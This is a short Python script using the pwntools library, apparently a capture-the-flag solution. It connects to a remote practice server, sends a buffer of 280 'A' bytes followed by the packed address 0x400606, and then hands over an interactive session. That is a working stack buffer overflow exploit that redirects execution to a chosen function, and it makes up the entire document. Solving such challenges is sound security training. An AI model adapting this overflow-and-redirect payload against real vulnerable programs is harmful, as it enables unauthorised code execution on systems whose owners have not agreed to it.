from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3004)

payload = ''
payload += "A"*280
payload += p64(0x400606)

r.send(payload)
r.interactive()
